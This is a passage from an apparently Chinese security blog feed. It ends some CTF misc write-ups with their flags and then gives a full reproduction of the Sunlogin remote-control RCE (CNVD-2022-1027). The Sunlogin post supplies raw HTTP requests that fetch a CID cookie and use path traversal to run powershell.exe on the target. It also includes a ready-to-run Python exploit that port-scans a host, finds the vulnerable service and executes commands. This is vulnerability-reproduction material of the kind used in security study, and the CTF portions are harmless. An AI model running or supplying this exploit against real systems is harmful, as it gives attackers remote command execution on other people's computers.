65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把数组里的值转成字符，然后base64解密得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">0000000101110000000011111101110000000</span><br><span class="line">0111110101101010111110001110110111110</span><br><span class="line">0100010100001111000111010110110100010</span><br><span class="line">0100010110000011000111000001010100010</span><br><span class="line">0100010111011011001101101011110100010</span><br><span class="line">0111110101110100000001001000010111110</span><br><span class="line">0000000101010101010101010101010000000</span><br><span class="line">1111111100100000000100110011111111111</span><br><span class="line">1100010101010000101111110100000011000</span><br><span class="line">0101101000110010010000100110101011101</span><br><span class="line">1011000001001111001100011010000010010</span><br><span class="line">1110111111110010101101000110101011100</span><br><span class="line">1010110001110000000110100000000000010</span><br><span class="line">0110101001000100011011101011101111101</span><br><span class="line">0010100100111111101110000110010100010</span><br><span class="line">0010001101110110110011001100110011101</span><br><span class="line">1110100110001111111011010011000000010</span><br><span class="line">0000111010100011100000101101111110111</span><br><span class="line">1101100110101101001100010100110000100</span><br><span class="line">0101001001111001000001001110010010111</span><br><span class="line">0101010011000111000110010000010101000</span><br><span class="line">1001101111101110110010011111101011101</span><br><span class="line">1101100010111000000101110110001011010</span><br><span class="line">0011001000111101100011110100100111101</span><br><span class="line">0101000001110101110110101111110100010</span><br><span class="line">0101011011001001000000110100010011111</span><br><span class="line">0110100010001110010110011011111001100</span><br><span class="line">0111001111100000010110110111001111100</span><br><span class="line">0100110010110010100010111011000000000</span><br><span class="line">1111111101011001110011100101011101011</span><br><span class="line">0000000111000111011010110001010100100</span><br><span class="line">0111110111001101010110101100011101111</span><br><span class="line">0100010100110000110011010000000000010</span><br><span class="line">0100010101111101100011111111110100111</span><br><span class="line">0100010101101111111100000010101010110</span><br><span class="line">0111110111111000101101001111000110110</span><br><span class="line">0000000111111011110110000000100011000</span><br></pre></td></tr></table></figure><p>是个猜测为37X37二维码，可能是二维码</p><p>识别二维码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</span><br></pre></td></tr></table></figure><h2 id="长安杯-八卦迷宫"><a href="#长安杯-八卦迷宫" class="headerlink" title="[长安杯]八卦迷宫"></a>[长安杯]八卦迷宫</h2><p>得到附件，走迷宫</p><p><img src="/image/media/2022/ctf/bmz/img/11.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</span><br></pre></td></tr></table></figure><h2 id="长安杯-Ez-Steg"><a href="#长安杯-Ez-Steg" class="headerlink" title="[长安杯]Ez_Steg"></a>[长安杯]Ez_Steg</h2><p>给了一个zip打开有提示：Password is six number爆破得到密码220101</p><p>得到表情txt:</p><p>🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌿🍴✉🍴🙃🌊🕹🖐🐍😁💵🕹🍵🏹💵😇🐎🕹✅🌊🥋👁✅✅🕹🌿😍😆🕹👁😂❓🔪🔬🔬🥋🚪☃🏹🚫🍍✉✅🤣🍌☂🛩ℹℹ☂🍎👉🚫🏹☂👌✉💵❓🕹✅👑🏹☀😡🤣✖🍌🐎😁😊😆🎤👌⌨🗒🗒</p><p>得到一个pyc：反编译，python版本3.6得到key：St3glsV3ryFuNny</p><p>所以是emoji-aes：然后解密<a href="https://aghorler.github.io/emoji-aes/%E5%BE%97%E5%88%B0flag">https://aghorler.github.io/emoji-aes/得到flag</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</span><br></pre></td></tr></table></figure><h2 id="长安杯-西安加油"><a href="#长安杯-西安加油" class="headerlink" title="[长安杯]西安加油"></a>[长安杯]西安加油</h2><p>打开流量包得到，导出http文件，得到一个secret文件，然后base64解密得到一个zip里面全是图片，要拼图</p><p>montage *png -tile 12x4 -geometry 100x100+0+0 out2.png</p><p>python3 gaps –image=out2.png –generations=10 –population=48 –size=100 –save</p><p>可以调整拼图也可以直接用拼图，按照图片名称</p><p><img src="/image/media/2022/ctf/bmz/img/12.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;make_XiAN_great_Again&#125;</span><br></pre></td></tr></table></figure><h2 id="长安杯-ez-Encrypt"><a href="#长安杯-ez-Encrypt" class="headerlink" title="[长安杯]ez_Encrypt"></a>[长安杯]ez_Encrypt</h2><p>从流量包里面得到一个web123，base64解密得到一个zip，里面是TP源码，然后用解出混淆工具</p><p>解密一下app\controller\index.php得到<a href="https://www.zhaoyuanma.com/phpjm.html">https://www.zhaoyuanma.com/phpjm.html</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sunlogin_rce复现</title>
      <link href="/article/2022-02-18-sunlogin_rce%E5%A4%8D%E7%8E%B0/"/>
      <url>/article/2022-02-18-sunlogin_rce%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>记录一下向日葵rce复现和端口扫描学习。</p><span id="more"></span><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnvd.org.cn/flaw/show/CNVD-2022-1027</span><br><span class="line">上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。</span><br></pre></td></tr></table></figure><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上海贝锐信息科技股份有限公司 向日葵个人版for Windows 11.0.0.33</span><br></pre></td></tr></table></figure><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>目前官网只有最新版可以下载V 12.5.1.44969（2022.02），之前可以根据爆破versionid来下载不同版本，但没成功，直接找了漏洞版本</p><p><img src="/image/media/2022/sunlogin_rce/0.png"></p><p><img src="/image/media/2022/sunlogin_rce//1.png"></p><p>这边用的版本是向日葵远程控制_11.0.0.33162，可以直接免安装运行</p><p><img src="/image/media/2022/sunlogin_rce//2.png"></p><p>运行左下角可以看到绿色连接服务器成功，并且有识别码和验证码，这样基本上环境就弄好了。</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>客户端在运行的时候会开启一个40000+的端口，首先用端口扫描得到这个端口，我用的是nmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p 1-65535 -v 192.168.3.198</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/sunlogin_rce//3.png"></p><p>可以看到存在误报，所以需要经过尝试后可以确定是56399端口</p><p><img src="/image/media/2022/sunlogin_rce//4.png"></p><p>然后构造如下数据包拿到CID:sobGzXzWBfSlSbdqnmkUbJMLEjhssRx1添加到cookie:CID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/rpc?action=verify-haras HTTP/1.1</span><br><span class="line">Host: 192.168.3.198:56399</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/sunlogin_rce//5.png"></p><p>也可以使用如下数据包得到CID、设备的公网、内网地址等信息</p><p>其中username和password分别表示主机的账号和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /cgi-bin/login.cgi?act=login&amp;username=admin&amp;password=admin&amp;hostname=1 HTTP/1.1</span><br><span class="line">Host: 192.168.3.198:56399</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=6onb943qKJoXQGAmr1BKArugFlO9949g</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/sunlogin_rce//6.png"></p><p>拿到CID之后构造如下数据包就能RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /check?cmd=ping../../../../../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami HTTP/1.1</span><br><span class="line">Host: 192.168.3.198:56399</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: CID=0243aFf9X19BCrB9vrfSLludf4jc9lai</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/sunlogin_rce//7.png"></p><h6 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h6><p>指纹信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">body=&quot;Verification failure&quot; &amp;&amp; body=&quot;false&quot; &amp;&amp; header=&quot;Cache-Control: no-cache&quot; &amp;&amp; header=&quot;Content-Length: 46&quot; &amp;&amp; header=&quot;Content-Type: application/json&quot;</span><br></pre></td></tr></table></figure><p>python版本exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">from datetime import datetime</span><br><span class="line">import socket</span><br><span class="line">import pyfiglet</span><br><span class="line">import requests</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">from fake_useragent import UserAgent</span><br><span class="line">open_port = []</span><br><span class="line"></span><br><span class="line">class ScanPort:</span><br><span class="line">    def __init__(self, ip):</span><br><span class="line">        # 初始化设置相关参数</span><br><span class="line">        self.ip = ip  # 需要扫描的IP</span><br><span class="line">        self.host = None</span><br><span class="line"></span><br><span class="line">    def scan(self, port):</span><br><span class="line">        # 执行扫描操作</span><br><span class="line">        try:</span><br><span class="line">            # 建立socket连接</span><br><span class="line">            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 地址簇,套接字类型</span><br><span class="line">            res = s.connect_ex((self.ip, port))</span><br><span class="line">            if res == 0:</span><br><span class="line">                print(&#x27;IP地址：&#123;0&#125;\tPort：&#123;1&#125;\t的状态是open&#x27;.format(self.ip, port))</span><br><span class="line">                open_port.append(port)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">        finally:</span><br><span class="line">            s.close()</span><br><span class="line"></span><br><span class="line">    def setting(self):</span><br><span class="line">        # 设置线程数和端口信息</span><br><span class="line">        port = [i for i in range(1, 65535)]  # 所有的端口列表</span><br><span class="line">        # host = socket.gethostbyname(self.ip)#设置主机名</span><br><span class="line">        socket.setdefaulttimeout(0.5)  # 设置超时</span><br><span class="line">        t1 = datetime.now()  # 开始时间</span><br><span class="line">        pool = ThreadPool(processes=1000)</span><br><span class="line">        pool.map(self.scan, port)</span><br><span class="line">        pool.close()</span><br><span class="line">        pool.join()</span><br><span class="line">        print(&#x27;[***] 端口扫描已完成，耗时：&#x27;, datetime.now() - t1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc(ip):</span><br><span class="line">    for port in open_port:</span><br><span class="line">        url = &#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port)+&#x27;/cgi-bin/rpc?action=verify-haras&#x27;</span><br><span class="line">        try:</span><br><span class="line">            res=requests.get(url,verify=False,timeout=1).text</span><br><span class="line">            if &#x27;verify_string&#x27; in res:</span><br><span class="line">                print(&#x27;[***]端口：&#123;0&#125;存在漏洞\n[***]url为：&#123;1&#125;&#x27;.format(str(port),url))</span><br><span class="line">                rce(&#x27;http://&#x27;+ip+&#x27;:&#x27;+str(port))</span><br><span class="line">                exit(0)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            pass</span><br><span class="line">def rce(url):</span><br><span class="line">    ua = UserAgent().random#随机UA</span><br><span class="line">    get_cid=json.loads(requests.get(url+&#x27;/cgi-bin/rpc?action=verify-haras&#x27;, verify=False, timeout=1).text)[&#x27;verify_string&#x27;]</span><br><span class="line">    print(get_cid)</span><br><span class="line">    headers=&#123;</span><br><span class="line">        &quot;User-Agent&quot;: ua,</span><br><span class="line">        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,</span><br><span class="line">        &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,</span><br><span class="line">        &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;,</span><br><span class="line">        &quot;Cookie&quot;: &quot;CID =&quot; + get_cid</span><br><span class="line">    &#125;</span><br><span class="line">    payload=url+&#x27;/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami&#x27;</span><br><span class="line">    req = requests.get(payload, headers=headers, verify=False).text</span><br><span class="line"></span><br><span class="line">    print(&#x27;[***]&#x27;+url+&#x27;存在漏洞\n&#x27;+req)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(pyfiglet.figlet_format(&#x27;sunlogin_rce&#x27;))</span><br><span class="line">    ip = input(&#x27;[*]输入要扫描的IP地址：&#x27;)</span><br><span class="line">    print(&#x27;[***]开始对端口进行扫描&#x27;)</span><br><span class="line">    ScanPort(ip).setting()</span><br><span class="line">    poc(ip)</span><br></pre></td></tr></table></figure><h2 id="0x05-修复方式"><a href="#0x05-修复方式" class="headerlink" title="0x05 修复方式"></a>0x05 修复方式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">升级最新版本</span><br></pre></td></tr></table></figure><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnvd.org.cn/flaw/show/CNVD-2022-1027</span><br><span class="line">/image/media/2022/sunlogin_rce/向日葵远程控制_11.0.0.33162.exe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
